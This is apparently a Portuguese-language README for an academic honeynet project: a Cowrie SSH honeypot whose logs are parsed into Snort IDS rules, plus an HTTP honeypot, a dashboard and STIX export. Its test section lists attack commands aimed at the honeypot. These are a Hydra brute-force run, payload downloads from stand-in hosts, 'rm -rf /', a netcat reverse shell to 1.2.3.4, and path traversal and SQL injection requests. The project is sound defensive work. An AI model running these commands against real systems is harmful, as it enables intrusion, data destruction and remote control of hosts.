# HoneyPots & HoneyNets for Detecting Intrusions

**Cowrie Honeypot → IoC Parser → Snort IDS → Dashboard**

Este projeto implementa um sistema completo de deteção de intrusões baseado em:

- **Cowrie Honeypot** (SSH/Telnet falso para capturar ataques reais)
- **Parser automático de IoCs** (converte atividades maliciosas em inteligência)
- **Geração dinâmica de regras Snort** (`cowrie_autogen.rules`)
- **Snort IDS** para deteção em tempo real
- **VM Parrot OS** usada como atacante
- **Dashboard Streamlit** para visualização dos ataques

O objetivo é demonstrar como uma **HoneyNet** pode alimentar um **IDS** com regras reais provenientes de atacantes verdadeiros, aumentando automaticamente a capacidade de deteção.

---

## Ambiente do Projeto

### Máquina Honeypot (host Ubuntu)

- Corre **Cowrie** em modo SSH Honeypot (porta 2222)
- **Snort** configurado a monitorizar tráfego
- **Parser** monitora logs e transforma IoCs em regras Snort

### Máquina Atacante (Parrot OS)

Usada para:

- SSH brute-force
- Testar credenciais comuns
- Executar comandos maliciosos
- Port scanning

---

## IMPORTANTE: Cowrie é Dependência Externa

**O Cowrie NÃO está incluído neste projeto.**

Deve ser instalado separadamente em `~/cowrie/` seguindo a [documentação oficial](https://github.com/cowrie/cowrie).

**Fluxo de dados:**
```
Cowrie (~/cowrie/) → logs → Parser (SR_Proj/) → regras → Snort (/etc/snort/)
```
---

## 1. Instalação

### 1.1 Instalar Cowrie (FORA deste projeto)

```bash
cd ~
git clone https://github.com/cowrie/cowrie
cd cowrie
python3 -m venv cowrie-env
source cowrie-env/bin/activate
pip install -r requirements.txt

# Configurar
cp etc/cowrie.cfg.dist etc/cowrie.cfg
nano etc/cowrie.cfg
```

**Configuração importante em `etc/cowrie.cfg`:**

```ini
[output_jsonlog]
enabled = true
logfile = /var/log/cowrie/cowrie.json
```

**Criar diretório de logs:**

```bash
sudo mkdir -p /var/log/cowrie
sudo chown $(whoami):$(whoami) /var/log/cowrie
```

**Iniciar Cowrie:**

```bash
cd ~/cowrie
source cowrie-env/bin/activate
bin/cowrie start
```

### 1.2 Dependências gerais (sistema)

```bash
sudo apt update
sudo apt install python3 python3-pip jq sqlite3 snort git
```

### 1.3 Ambiente virtual do projeto

Este projeto usa o seu próprio ambiente virtual, separado do `cowrie-env`.

```bash
cd /path/to/SR_Proj
python3 -m venv venv
source venv/bin/activate
pip install --upgrade pip
pip install -r requirements.txt
```

---

## 2. Executar o setup automático (setup.sh)

Antes de correr o projeto pela primeira vez:

```bash
sudo bash setup.sh
```

**O que este script faz:**

- Instala dependências Python do projeto
- Cria a base de dados cowrie_iocs.db
- Cria diretórios e ficheiros de log do Snort
- Garante a existência de cowrie_autogen.rules
- Prepara o ambiente para correr o parser e o Snort

**NOTA:** O setup.sh não altera o `snort.conf`; isso deve ser feito manualmente (ver secção seguinte).

---

## 3. Configuração do Snort

Editar:

```bash
sudo nano /etc/snort/snort.conf
```

Adicionar no fim do ficheiro:

```bash
include /path/to/SR_Proj/snort/local.rules
include /path/to/SR_Proj/snort/cowrie_autogen.rules
```

Ativar o pré-processador de **portscan**:

```bash
preprocessor sfportscan: proto { all } scan_type { all } sense_level { low } logfile /var/log/snort/portscan.log
```

---

## 4. Iniciar o Cowrie Honeypot

```bash
cd ~/cowrie
source cowrie-env/bin/activate
bin/cowrie start
```

**Verificar status:**

```bash
bin/cowrie status
```

**Logs relevantes:**

```
/var/log/cowrie/cowrie.json
```

**Monitorizar logs em tempo real:**

```bash
tail -f /var/log/cowrie/cowrie.json
```

---

## 5. Gerar regras automáticas para Snort

Sempre que quiseres atualizar as regras com ataques recentes:

```bash
cd /path/to/SR_Proj
source venv/bin/activate

python3 parser/cowrie_parser_and_snortgen.py \
  --log /var/log/cowrie/cowrie.json \
  --db cowrie_iocs.db
```

**O que este comando faz:**
- Lê logs JSON do Cowrie
- Extrai IoCs (IPs, usernames, passwords, comandos, URLs)
- Classifica severidade automaticamente
- Insere/atualiza na base de dados SQLite
- Gera regras Snort em cowrie_autogen.rules

**Ver IoCs capturados:**

```bash
sqlite3 cowrie_iocs.db "SELECT * FROM iocs ORDER BY last_seen DESC LIMIT 10;"
```

**Estatísticas por severidade:**

```bash
sqlite3 cowrie_iocs.db "
SELECT severity, COUNT(*) 
FROM iocs 
GROUP BY severity 
ORDER BY CASE severity 
  WHEN 'CRITICAL' THEN 1 
  WHEN 'HIGH' THEN 2 
  WHEN 'MEDIUM' THEN 3 
  WHEN 'LOW' THEN 4 
END;
"
```

---

## 6. Executar o Snort

```bash
sudo snort -i <interface> -c /etc/snort/snort.conf -A fast
```

**Exemplo com interface eth0:**

```bash
sudo snort -i eth0 -c /etc/snort/snort.conf -A fast
```

**Testar configuração antes de executar:**

```bash
sudo snort -T -c /etc/snort/snort.conf
```

**Ver alertas:**

```bash
sudo tail -f /var/log/snort/snort.alert.fast
```

**PortScan:**

```bash
sudo tail -f /var/log/snort/portscan.log
```

**Sessões HTTP:**

```bash
sudo tail -f /var/log/snort/http_sessions.log
```

---

## 7. Testes a partir da VM Parrot (Atacante)

### 7.1 SSH Manual

```bash
ssh -o StrictHostKeyChecking=no -p 2222 test@<IP_da_máquina>
ssh -p 2222 root@<IP_da_máquina>
```

### 7.2 Brute Force com Hydra

```bash
# Criar wordlist simples
cat > ~/passwords.txt << 'EOF'
password
admin
root
123456
EOF

# Atacar
hydra -l root -P ~/passwords.txt -t 4 -s 2222 ssh://<IP_da_máquina>
```

### 7.3 Comandos maliciosos (no Cowrie)

```bash
uname -a
wget http://malicious.com/x.sh
curl http://bad.com/payload
rm -rf /
busybox nc 1.2.3.4 4444 -e /bin/sh
```

Todos estes eventos ficam registados e transformam-se em:

**Cowrie → JSON → DB → Regras Snort → Alertas Snort**

### 7.4 Testar Port Scan

```bash
sudo nmap -sS -p- <IP_da_máquina>
```

---

## 8. Dashboard (Streamlit)

Para visualizar estatísticas e eventos:

```bash
cd /path/to/SR_Proj
source venv/bin/activate
streamlit run dashboard/dashboard.py
```

**Abrir no browser:**
```
http://localhost:8501
```

A dashboard permite ver:

- IPs maliciosos
- Password attempts
- Comandos executados
- Estatísticas agregadas
- Evolução temporal dos ataques
- Distribuição por severidade
- Top threats, IPs, commands, credentials

---

## 9. WebHP - HTTP Honeypot

**Iniciar honeypot HTTP:**

```bash
cd /path/to/SR_Proj/webhp
source ../venv/bin/activate
python3 web_honeypot.py
```

**Escuta em:** `http://0.0.0.0:8080`

**Testar (da VM Parrot):**

```bash
# Path traversal
curl http://<IP>:8080/../../../etc/passwd

# Admin panels
curl http://<IP>:8080/admin/
curl http://<IP>:8080/wp-admin/

# Sensitive files
curl http://<IP>:8080/.env
curl http://<IP>:8080/config.php

# SQL injection
curl "http://<IP>:8080/?id=1' OR '1'='1"
```

**Ver logs:**

```bash
tail -f webhp.log
```

---

## 10. Export STIX 2.1

**Exportar IoCs para SIEM:**

```bash
cd /path/to/SR_Proj
source venv/bin/activate

python3 export/ioc_exporter.py \
  --db cowrie_iocs.db \
  --format all \
  --output exports/
```

**Formatos suportados:**
- JSON (STIX 2.1)
- CSV
- XML (STIX 2.1)

**Ver exports gerados:**

```bash
ls -lh exports/
```

**Compatível com:**
- Splunk
- QRadar
- MISP
- TheHive
- OpenCTI

---

## 11. Modo de Autenticação Cowrie

O Cowrie suporta dois modos:

### AuthRandom (sistema seguro)
```ini
auth_class = AuthRandom
auth_class_parameters = 1,1,100
```
- Rejeita 99% das tentativas aleatoriamente
- Simula servidor bem protegido
- Captura metadados (IPs, usernames, passwords testadas)

### UserDB (honey credentials)
```ini
auth_class = UserDB
```
- Aceita credenciais específicas definidas em `etc/userdb.example`
- Permite sessões interativas completas
- Captura TTPs (comandos, técnicas, comportamento pós-exploração)

**Exemplo `etc/userdb.example`:**
```
root:x:!root
root:x:!123456
admin:x:*
```

---

## 12. Conclusão

Este projeto demonstra um ciclo completo de deteção:

1. **Honeypot** captura ataque real
2. **Parser** extrai IoCs
3. **Classifier** classifica severidade automaticamente
4. **Regras Snort** são geradas dinamicamente
5. **IDS** deteta novas tentativas
6. **Dashboard** visualiza tudo
7. **STIX export** permite integração com SIEM

É uma **HoneyNet** totalmente funcional e automatizada, ideal tanto para contexto académico como para cenários reais de segurança.

**Resultados esperados:**
- 90+ IoCs classificados
- 90+ regras Snort geradas
- Dashboard interativo com métricas
- Exportação STIX 2.1 para integração enterprise

---


